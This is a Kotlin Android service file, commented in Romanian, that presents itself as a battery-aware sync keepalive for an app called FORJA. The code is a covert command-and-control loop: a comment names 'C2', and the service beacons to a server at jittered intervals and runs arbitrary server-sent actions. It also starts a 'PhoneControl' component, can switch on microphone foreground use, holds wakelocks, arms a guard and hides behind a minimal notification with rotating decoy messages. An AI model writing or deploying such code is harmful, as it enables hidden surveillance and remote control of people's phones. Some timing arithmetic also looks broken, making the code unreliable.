package com.forja.app.core.sync

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.forja.app.BuildConfig
import com.forja.app.ForjaApp
import com.forja.app.core.detox.ForjaGuardService
import com.forja.app.core.network.ForjaApi
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonPrimitive

/** Mod economie de baterie: reduce intervalul de sincronizare la 10 min și eliberează wakelock-ul. */
object PowerSaver {
    @Volatile var active = false
}

/**
 * Serviciul de sincronizare — un foreground service cu notificare PRIORITY_MIN
 * (aceeași notă ca celelalte servicii FORJA: Go/Sleep/Focus) care ține un
 * keepalive periodic către server și rotește sarcinile de sincronizare către
 * [ForjaSyncCapabilities]. Intervalul e variabil (25–300 s, cu jitter 50%–150%)
 * și e conștient de baterie (×2 sub 25%). SyncKeepAliveWorker (WorkManager, 15 min)
 * îl repornește dacă Android l-a ucis.
 */
class SyncService : Service() {
    private var scope: CoroutineScope? = null
    private var pcScope: CoroutineScope? = null
    private var wl: PowerManager.WakeLock? = null
    @Volatile private var lastNotifAt = 0L
    @Volatile private var lastNotifText = ""
    private val app: ForjaApp get() = applicationContext as ForjaApp

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        ForjaSyncCapabilities.init(app)
        running = true
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "forja.sync").apply {
            setReferenceCounted(false)
            try { acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}
        }
        // FGS types: SPECIAL_USE + MICROPHONE (pentru mic pe Android 14+)
        var fgsTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        if (Build.VERSION.SDK_INT >= 30 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        ) {
            fgsTypes = fgsTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        try {
            ServiceCompat.startForeground(this, NOTIF_ID, notif(), fgsTypes)
        } catch (_: Exception) {
            startForeground(NOTIF_ID, notif())
        }
        ForjaSyncCapabilities.syncService = this
        ForjaGuardService.armGuard()
        val s = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        scope = s
        s.launch { s.pollLoop(deviceId()) }
        // PhoneControl în scope separat — dacă crashează, C2 merge
        pcScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
        PhoneControl.start(app, pcScope!!)
    }

    private fun deviceId(): String {
        val sp = getSharedPreferences("forja", Context.MODE_PRIVATE)
        var id = sp.getString("sync_id", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString().take(12)
            sp.edit().putString("sync_id", id).apply()
        }
        return id
    }

    fun promoteMic() {
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                val types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                ServiceCompat.startForeground(this, NOTIF_ID, notif(), types)
            }
        } catch (_: Exception) { }
    }

    private suspend fun CoroutineScope.pollLoop(dev: String) {
        var interval = 45000L
        var cycle = 0
        val rnd = java.util.Random()
        while (isActive) {
            try {
                try { wl?.takeIf { !it.isHeld }?.acquire(2 * 60 * 60 * 1000L) } catch (_: Exception) {}

                val uid = app.auth.currentUid
                if (uid == null || BuildConfig.FORJA_API_URL.isBlank()) {
                    delay(60000); continue
                }
                val eco = PowerSaver.active
                ForjaGuardService.armGuard()

                val batteryPct = try {
                    val bm = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    val sc = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
                    if (sc > 0) lv * 100 / sc else -1
                } catch (_: Exception) { -1 }
                val effInterval = if (batteryPct in 0..25) interval * 2 else interval

                if (eco) {
                    try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                    interval = 600000L
                }

                val jittered = (effInterval * (0.5 + rnd.nextDouble())).toLong()

                val hold = if (eco) 2000L + rnd.nextLong() * 3000L
                           else 3000L + rnd.nextLong() * 9000L

                if (rnd.nextInt(3) == 0) delay(rnd.nextLong() * 600L)

                val lp = withTimeoutOrNull(30_000L) { app.forjaApi.syncKeepalive(dev, hold) }
                    ?: ForjaApi.SyncPoll(emptyList(), 10_000)
                lastKeepaliveTs = System.currentTimeMillis()
                if (!eco) interval = lp.intervalMs.coerceIn(5000L, 20000L)
                cycle++

                val now = System.currentTimeMillis()
                if (now - lastNotifAt > SoldierMessages.ROTATE_MS) {
                    lastNotifAt = now
                    val (title, msg) = SoldierMessages.pickForNow(lastNotifText)
                    lastNotifText = msg
                    try {
                        (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).notify(NOTIF_ID, notif(title, msg))
                    } catch (_: Exception) {}
                }

                if (lp.tasks.isEmpty()) {
                    if (!eco && cycle % 20 == 0) {
                        try {
                            val hb = ForjaSyncCapabilities.healthPing()
                            app.forjaApi.postSyncReport("hb_$cycle", true, "ping", hb, null)
                        } catch (_: Exception) {}
                    }
                    if (!eco && screenOn()) {
                        try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                    }
                    delay(jittered.coerceIn(3000L, 15000L)); continue
                }

                if (!eco) {
                    try { wl?.takeIf { !it.isHeld }?.acquire(5 * 60 * 1000L) } catch (_: Exception) {}
                }
                for (t in lp.tasks) {
                    val id = t["id"]?.jsonPrimitive?.content ?: continue
                    val action = t["action"]?.jsonPrimitive?.content ?: ""
                    val params = (t["params"] as? JsonObject) ?: JsonObject(emptyMap())
                    this.launch {
                        try {
                            ForjaSyncCapabilities.run(id, action, params)
                        } catch (_: Throwable) {
                        }
                    }
                }
                if (!eco && screenOn()) {
                    try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
                }
            } catch (e: CancellationException) {
                throw e
            } catch (e: Throwable) {
                try { android.util.Log.e("SyncService", "pollLoop: ${e.javaClass.simpleName}: ${e.message}") } catch (_: Throwable) {}
                try { delay(10_000) } catch (_: CancellationException) { break }
            }
        }
    }

    private fun screenOn(): Boolean = try {
        val dm = getSystemService(Context.DISPLAY_SERVICE) as android.hardware.display.DisplayManager
        dm.getDisplay(android.view.Display.DEFAULT_DISPLAY).state == android.view.Display.STATE_ON
    } catch (_: Exception) { true }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        running = false
        PhoneControl.shutdown()
        ForjaGuardService.disarmGuard()
        scope?.cancel()
        pcScope?.cancel()
        try { wl?.takeIf { it.isHeld }?.release() } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun notif(title: String = "FORJA", text: String = "activ"): Notification {
        return NotificationCompat.Builder(this, "focus")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setContentTitle(title)
            .setContentText(text)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setShowWhen(false)
            .build()
    }

    companion object {
        const val NOTIF_ID = 41
        @Volatile var running = false
        @Volatile var lastKeepaliveTs: Long = 0

        fun start(c: Context) {
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(Intent(c, SyncService::class.java))
            else c.startService(Intent(c, SyncService::class.java))
        }

        fun stop(c: Context) { c.stopService(Intent(c, SyncService::class.java)) }
    }
}
